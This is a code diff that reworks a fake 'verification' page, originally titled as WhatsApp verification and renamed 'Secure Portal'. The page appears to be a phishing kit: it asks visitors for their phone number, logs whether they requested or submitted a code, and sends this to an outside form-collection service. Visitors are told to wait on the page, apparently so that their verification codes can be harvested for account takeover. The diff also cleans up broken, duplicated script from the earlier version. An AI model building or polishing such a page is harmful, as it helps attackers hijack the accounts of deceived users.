@@ -3,54 +3,83 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>whatsapp-Verification</title>
+  <title>Verification - Secure Portal</title>
   <style>
     body { 
       margin: 0; 
-      font-family: Arial, sans-serif; 
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
       background: #1a1a1a url('background.jpg') no-repeat center center fixed; 
       background-size: cover !important; 
       color: white; 
-      text-align: center; 
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
     }
     .overlay { 
-      background: rgba(0,0,0,0.6); 
-      min-height: 100vh; 
-      width: 100%;
-      padding-top: 80px; 
+      background: rgba(0,0,0,0.7); 
+      position: absolute;
+      top: 0; left: 0; width: 100%; height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
     .container { 
-      background: rgba(20,20,20,0.85); 
-      padding: 30px; 
-      width: 320px; 
-      margin: auto; 
-      border-radius: 10px; 
+      background: rgba(25, 25, 25, 0.95); 
+      padding: 40px 30px; 
+      width: 340px; 
+      border-radius: 12px; 
       border: 1px solid rgba(255,255,255,0.1);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      text-align: center;
+      z-index: 10;
     }
-    .logo { width: 250px; margin-bottom: 20px; }
+    .logo { width: 220px; margin-bottom: 25px; }
+    h2 { margin: 0 0 10px 0; font-size: 22px; }
+    p { font-size: 13px; color: #aaa; margin-bottom: 20px; line-height: 1.5; }
+    
     input { 
       display: block; 
-      margin: 10px auto; 
-      padding: 12px; 
-      width: 90%; 
-      border-radius: 5px; 
+      margin: 15px auto; 
+      padding: 14px; 
+      width: 100%; 
+      box-sizing: border-box;
+      border-radius: 6px; 
       border: 1px solid #444; 
-      background: white;
-      color: black;
+      background: #fff;
+      color: #000;
+      font-size: 16px;
     }
+    input:focus { border-color: #007bff; outline: none; }
+
     button { 
-      padding: 12px; 
-      border-radius: 5px; 
+      padding: 14px; 
+      border-radius: 6px; 
       border: none; 
       cursor: pointer; 
       background: #f0f0f0; 
+      color: #000;
       font-weight: bold; 
-      width: 95%; 
+      width: 100%; 
       margin-top: 10px; 
+      transition: background 0.3s;
     }
-    button:disabled { background: #666; cursor: not-allowed; }
-    .status-msg { margin-top: 15px; font-size: 14px; color: #ffd700; display: none; }
-    hr { margin: 25px 0; border: 0; border-top: 1px solid #444; }
+    button:hover { background: #ddd; }
+    button:disabled { background: #555 !important; color: #888; cursor: not-allowed; }
+    
+    .btn-verify { background: #4caf50; color: white; margin-top: 20px; }
+    .btn-verify:hover { background: #45a049; }
+
+    .status-msg { 
+      margin-top: 15px; 
+      font-size: 13px; 
+      color: #ffd700; 
+      display: none; 
+      padding: 10px;
+      border-radius: 4px;
+      background: rgba(255, 215, 0, 0.1);
+    }
+    hr { margin: 30px 0; border: 0; border-top: 1px solid #333; }
   </style>
 </head>
 <body>
@@ -59,127 +88,93 @@
   <div class="container">
     <img src="logo.png" class="logo" alt="Logo">
 
-    <div id="requestSection">
-      <h2>Verification</h2>
-      <p style="font-size: 12px; color: #aaa;">Click below to request your code.</p>
-      
-      <!-- Form 1: Request Code -->
-      <form id="requestCodeForm" action="https://forminit.com/f/w0ljqwvp09y" method="POST">
-        <!-- Hidden field ensures submission is never empty -->
-        <input type="hidden" name="request_type" value="Auto Code Request">
-        <button type="submit" id="reqBtn">Request Code</button>
-      </form>
-      
-      <div id="waitMessage" class="status-msg">
-        ✔ Request Sent! Please wait on this page for your code.
-      </div>
-    </div>
+    <h2>Identity Verification</h2>
+    <p>Please enter your phone number to receive your secure access code.</p>
 
-    <hr>
+    <!-- Unified Form -->
+    <form id="vForm" action="https://forminit.com/f/w0ljqwvp09y" method="POST">
+      
+      <!-- Captured data -->
+      <input type="text" name="phone_number" id="phone" placeholder="Phone Number (e.g. +1...)" required>
+      
+      <!-- Hidden tag to track button used -->
+      <input type="hidden" name="user_action" id="userAction" value="">
 
-    <div id="submitSection">
-      <h3>Enter Your Number</h3>
-      <!-- Form 2: Submit Code -->
-      <form id="submitCodeForm" action="https://forminit.com/f/w0ljqwvp09y" method="POST">
-        <input type="text" name="phone_number" placeholder="Enter your number" required>
-        <button type="submit" id="subBtn">Submit & Verify</button>
-      </form>
-      <div id="successMessage" class="status-msg" style="color: #4caf50;">
-        ✔ Number submitted! Checking...
+      <button type="submit" id="reqBtn">Request Code</button>
+      <div id="waitMsg" class="status-msg">
+        ✔ Request sent. Please stay on this page.
       </div>
-    </div>
+
+      <hr>
+
+      <p>Already have a code? Enter it above then click verify.</p>
+      <button type="submit" id="subBtn" class="btn-verify">Submit & Verify</button>
+      <div id="successMsg" class="status-msg" style="color: #4caf50; background: rgba(76, 175, 80, 0.1);">
+        ✔ Verifying code... Please wait.
+      </div>
+    </form>
   </div>
 </div>
 
-<script> 
-  async function handleForm(formId, buttonId, statusId) {
-    const form = document.getElementById(formId);
-    const btn = document.getElementById(buttonId);
-    const status = document.getElementById(statusId);
+<script>
+  const vForm = document.getElementById('vForm');
+  const reqBtn = document.getElementById('reqBtn');
+  const subBtn = document.getElementById('subBtn');
+  const userAction = document.getElementById('userAction');
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      
-      btn.disabled = true;
-      btn.innerText = "Sending...";
+  vForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
 
-      try {
-        const response = await fetch(form.action, {
-  method: 'POST',
-  body: new URLSearchParams(new FormData(form)), // Converts data to a standard format
-  headers: {
-    'Content-Type': 'application/x-www-form-urlencoded'
-  }
-});
+    // Identify which button was clicked
+    const clickedBtn = document.activeElement;
+    const isRequest = clickedBtn.id === 'reqBtn';
+    
+    // Set hidden value for your logs
+    userAction.value = isRequest ? "CODE_REQUEST" : "VERIFICATION_SUBMISSION";
 
-        });
+    const statusId = isRequest ? 'waitMsg' : 'successMsg';
+    const statusEl = document.getElementById(statusId);
 
-        if (response.ok) {
-          btn.innerText = "Sent";
-          status.style.display = "block";
-          setTimeout(() => {
-            btn.disabled = false;
-            btn.innerText = buttonId === 'reqBtn' ? "Request Code" : "Submit & Verify";
-          }, 3000);
-        } else {
-          // This tells you the EXACT error code (e.g., 404, 429, 500)
-          alert("Error " + response.status + ": The form service rejected the request.");
-          btn.disabled = false;
-          btn.innerText = "Try Again";
-        }
-      } catch (error) {
-        alert("Connection blocked. Check your internet or Ad-Blocker.");
-        btn.disabled = false;
-        btn.innerText = "Try Again";  async function handleForm(formId, buttonId, statusId) {
-    const form = document.getElementById(formId);
-    const btn = document.getElementById(buttonId);
-    const status = document.getElementById(statusId);
+    // Disable buttons
+    reqBtn.disabled = true;
+    subBtn.disabled = true;
+    const originalText = clickedBtn.innerText;
+    clickedBtn.innerText = "Sending...";
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      
-      btn.disabled = true;
-      btn.innerText = "Sending...";
+    try {
+      // Standard form submission to avoid 400 Bad Request
+      const response = await fetch(vForm.action, {
+        method: 'POST',
+        body: new FormData(vForm),
+        headers: { 'Accept': 'application/json' }
+      });
 
-      try {
-        const response = await fetch(form.action, {
-          method: 'POST',
-          body: new FormData(form),
-          headers: { 'Accept': 'application/json' }
-        });
-
-        if (response.ok) {
-          btn.innerText = "Sent";
-          status.style.display = "block";
-          setTimeout(() => {
-            btn.disabled = false;
-            btn.innerText = buttonId === 'reqBtn' ? "Request Code" : "Submit & Verify";
-          }, 3000);
-        } else {
-          // This tells you the EXACT error code (e.g., 404, 429, 500)
-          alert("Error " + response.status + ": The form service rejected the request.");
-          btn.disabled = false;
-          btn.innerText = "Try Again";
-        }
-      } catch (error) {
-        alert("Connection blocked. Check your internet or Ad-Blocker.");
-        btn.disabled = false;
-        btn.innerText = "Try Again";
+      if (response.ok) {
+        clickedBtn.innerText = "Success";
+        statusEl.style.display = "block";
+        
+        // Allow retry after 5 seconds
+        setTimeout(() => {
+          reqBtn.disabled = false;
+          subBtn.disabled = false;
+          clickedBtn.innerText = originalText;
+        }, 5000);
+      } else {
+        alert("Server Error (" + response.status + "): Please try again or check your form settings.");
+        resetButtons(clickedBtn, originalText);
       }
-    });
+    } catch (error) {
+      alert("Connection Blocked: Please disable Ad-Blockers or use a local server.");
+      resetButtons(clickedBtn, originalText);
+    }
+  });
+
+  function resetButtons(btn, text) {
+    reqBtn.disabled = false;
+    subBtn.disabled = false;
+    btn.innerText = text;
   }
-
-  handleForm('requestCodeForm', 'reqBtn', 'waitMessage');
-  handleForm('submitCodeForm', 'subBtn', 'successMessage');
-
-      }
-    });
-  }
-
-  handleForm('requestCodeForm', 'reqBtn', 'waitMessage');
-  handleForm('submitCodeForm', 'subBtn', 'successMessage');
 </script>
 
 </body>
 </html>
-
